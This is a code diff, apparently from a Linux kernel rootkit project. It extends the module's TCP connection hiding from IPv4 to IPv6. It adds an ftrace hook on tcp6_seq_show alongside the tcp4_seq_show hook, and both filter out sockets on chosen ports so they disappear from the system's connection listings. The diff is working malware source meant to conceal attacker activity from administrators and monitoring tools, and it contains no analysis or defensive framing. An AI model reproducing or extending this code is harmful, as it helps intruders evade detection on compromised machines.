@@ -46,7 +46,7 @@ asmlinkage long new_tcp4_seq_show(struct seq_file *seq, void *v)
 //            return 0;
 //        }
 
-        if (is_tcp_port_hidden(ntohs(is->inet_sport))) {
+        if (is_tcp4_port_hidden(ntohs(is->inet_sport))) {
             printk(KERN_DEBUG "rootkit: sport: %d, dport: %d, %d\n",
                     ntohs(is->inet_sport), ntohs(is->inet_dport));
             return 0;
@@ -55,6 +55,30 @@ asmlinkage long new_tcp4_seq_show(struct seq_file *seq, void *v)
     }
 
     return orig_tcp4_seq_show(seq, v);
+}
+
+asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
+asmlinkage long new_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+    if (v != SEQ_START_TOKEN) {
+        struct inet_sock *is = (struct inet_sock *)v;
+
+//        unsigned short port = htons(8081);
+//        if (port == is->inet_sport || port == is->inet_dport) {
+//            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
+//                    ntohs(is->inet_sport), ntohs(is->inet_dport));
+//            return 0;
+//        }
+
+        if (is_tcp6_port_hidden(ntohs(is->inet_sport))) {
+            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d, %d\n",
+                    ntohs(is->inet_sport), ntohs(is->inet_dport));
+            return 0;
+        }
+
+    }
+
+    return orig_tcp6_seq_show(seq, v);
 }
 
 
@@ -73,7 +97,8 @@ struct syscall_hook_handle* hooks_arr[] = {
         &chown_hook
 };
 
-struct ftrace_hook tcp_hook = HOOK("tcp4_seq_show", new_tcp4_seq_show, &orig_tcp4_seq_show);
+struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", new_tcp4_seq_show, &orig_tcp4_seq_show);
+struct ftrace_hook tcp6_hook = HOOK("tcp6_seq_show", new_tcp6_seq_show, &orig_tcp6_seq_show);
 
 static int __init
 
@@ -92,9 +117,10 @@ rootkit_init(void) {
     }
 
     // hook tcp handler function
-    for (int i = 0; i < NO_PORTS; i++)
-        remove_hidden_tcp_port(i);
-    fh_install_hook(&tcp_hook);
+//    for (int i = 0; i < NO_PORTS; i++)
+//        remove_hidden_tcp_port(i);
+    fh_install_hook(&tcp4_hook);
+    fh_install_hook(&tcp6_hook);
 
     initialize_trie();
 
@@ -115,7 +141,8 @@ void exit_my_module(void) {
     }
 
     // unhook tcp handler function
-    fh_remove_hook(&tcp_hook);
+    fh_remove_hook(&tcp4_hook);
+    fh_remove_hook(&tcp6_hook);
 
     finish_trie();
 
